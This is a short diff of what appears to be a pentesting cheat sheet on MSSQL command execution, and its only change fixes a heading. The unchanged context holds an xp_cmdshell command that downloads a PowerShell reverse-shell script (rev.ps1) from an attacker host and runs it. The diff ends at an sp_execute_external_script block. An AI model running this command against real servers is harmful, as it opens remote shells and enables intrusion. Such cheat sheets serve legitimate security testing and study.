@@ -32,7 +32,7 @@ SQL> xp_cmdshell whoami /all
 SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
 ```
 
-#Import other lenguaje
+# Import other lenguaje
 ```
 EXEC sp_execute_external_script @language = N'Python',
 @script = N'
